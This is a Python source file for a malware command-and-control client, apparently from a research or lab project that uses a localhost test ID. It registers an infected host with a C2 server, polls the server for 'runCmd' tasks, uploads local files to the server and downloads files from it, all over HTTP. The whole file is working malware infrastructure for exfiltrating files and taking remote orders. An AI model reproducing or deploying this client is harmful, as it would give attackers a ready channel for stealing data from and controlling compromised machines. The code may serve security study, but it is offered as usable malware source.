#!/usr/bin/python
#-----------------------------------------------------------------------------
# Name:        c2Client.py [python3]
#
# Purpose:     This module is the client running parellel with the malware's main
#              thread to report to the C2 regular.
#  
# Author:      Yuancheng Liu
#
# Created:     2022/01/09
# version:     v0.2.1
# Copyright:   Copyright (c) 2022 LiuYuancheng
# License:     MIT License
#-----------------------------------------------------------------------------

import os
import time
import requests

dirpath = os.path.dirname(__file__)

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
class c2Client(object):

    def __init__(self, malwareID, c2Ipaddr, c2Port=5000, ownIP='127.0.0.1') -> None:
        self.id = malwareID
        self.ipaddr = ownIP
        self.c2Ipaddr = c2Ipaddr
        self.c2Port = c2Port
        self.freeFlg = True
        self.connected = False 
        self.urlDict = self._getUrlDict()
        self.taskQueue = []
        self.fileProcessFunction = None 
        self.downloadDir = None 
        self.terminate = False
        self.reportLock = False 

    def _rptMEcheck(self):
        """ report mutual Exclusion check."""
        while self.reportLock:
            time.sleep(0.01)

    #-----------------------------------------------------------------------------
    def _getUrlDict(self):
        return {
            'getFile': "http://%s:%s/filedownload" % (self.c2Ipaddr, str(self.c2Port)),
            'postData': "http://%s:%s/dataPost/" % (self.c2Ipaddr, str(self.c2Port)),
            'postFile': "http://%s:%s/fileupload" % (self.c2Ipaddr, str(self.c2Port))
        }

    #-----------------------------------------------------------------------------
    def registerToC2(self):
        res = self.reportTohub(action='register', data={'ipaddr':self.ipaddr})
        if not(res is None) and res['state'] == 'ok':
            self.connected = True
            print("Connected to the C2 server ")
            return True
        return False 

    #-----------------------------------------------------------------------------
    def getTaskFromC2(self):
        """ try to get the task from C2."""
        if self.connected:
            res = self.reportTohub(action='getTask', data=None)
            if res is None: return
            if res['task'] == 'runCmd':
                return res['data']
            elif res['task'] == 'upload':
                pass

    #-----------------------------------------------------------------------------
    def TransferFiles(self, filePathList, uploadFlg=True):
        #if transferType
        if uploadFlg:
            for filePath in  filePathList:
                self.uploadfile(filePath, dataProcessFun=self.fileProcessFunction)
                time.sleep(0.1) # sleep a short time after the file uploaded.
        else:
            for fileName in filePathList:
                self.downloadfile(fileName, 
                                  fileDir=self.downloadDir,
                                  dataProcessFun=self.fileProcessFunction)
                time.sleep(0.1)

    #-----------------------------------------------------------------------------
    def uploadfile(self, filePath, dataProcessFun=None):
        """ Upload a file which is smaller than the TCP max buffer size."""
        if os.path.exists(filePath):
            try:
                filename = os.path.basename(filePath)
                with open(filePath, 'rb') as fh:
                    filedata = fh.read() if dataProcessFun is None else dataProcessFun(fh.read())
                    uploadUrl = self.urlDict['postFile']
                    dataDict = {'file': (filename, filedata)}
                    res = self._postData(uploadUrl, dataDict, postfile=True)
                    return res
            except Exception as err:
                print("File IO error: %s" % str(err))
                return None
        else:
            print("Upload file : %s not exist" % str(filePath))
            return None

    #-----------------------------------------------------------------------------
    def downloadfile(self, filename, fileDir=None, dataProcessFun=None):
        if fileDir and not os.path.isdir(fileDir): os.mkdir(fileDir)
        filePath = os.path.join(dirpath, filename) if fileDir is None else os.path.join(fileDir, filename)
        uploadUrl = self.urlDict['getFile']
        dataDict = {"filename": filename}
        filedata = self._getData(uploadUrl, dataDict, getFile=True)
        if dataProcessFun: filedata = dataProcessFun(filedata)
        try:
            with open(filePath, 'wb') as fh:
                fh.write(filedata)
        except Exception as err:
            print("download file error : %s" %str(err))

#-----------------------------------------------------------------------------
    def reportTohub(self, action=None, data=None):
        """ Report to the hub the schduler's inforamtion to register."""
        jsonDict = {
            'id': self.id,
            'free': self.freeFlg,
            'action': action,
            'data': data
        }
        reportUrl = self.urlDict['postData']
        reportUrl += str(jsonDict['id'])
        return self._postData(reportUrl, jsonDict)


    def setFileProcessFunction(self, func):
        self.fileProcessFunction = func

    #-----------------------------------------------------------------------------
    def _getData(self, getUrl, jsonDict, getFile=False):
        self._rptMEcheck()
        try:
            self.reportLock = True 
            res = requests.get(getUrl, json=jsonDict, allow_redirects=True)
            if res.ok:
                self.reportLock = False
                return res.content if getFile else res.json()
        except Exception as err:
            print("http server not reachable, error: %s" %str(err))
            self.connected = False
            self.reportLock = False
            return None
        
    #-----------------------------------------------------------------------------
    def _postData(self, postUrl, jsonDict, postfile=False):
        self._rptMEcheck()
        try:
            self.reportLock = True 
            res = requests.post(postUrl, files=jsonDict) if postfile else requests.post(postUrl, json=jsonDict)
            if res.ok: 
                print("http server reply: %s" %str(res.json()))
                self.reportLock = False
                return res.json()
            else:
                print("post error: %s" % str(res.err))
                self.reportLock = False
                return None
        except Exception as err:
            print("http server not reachable, error: %s" %str(err))
            self.connected = False
            self.reportLock = False
            return None

#-----------------------------------------------------------------------------
#-----------------------------------------------------------------------------
def main():
    client = c2Client('testMalware-0','127.0.0.1', c2Port=5000)
    client.registerToC2()
    #filePath = os.path.join(dirpath, 'update_installer.zip')
    #client.uploadfile(filePath)
    #client.downloadfile('2023-12-13_100327.png')

if __name__ == '__main__':
    main()
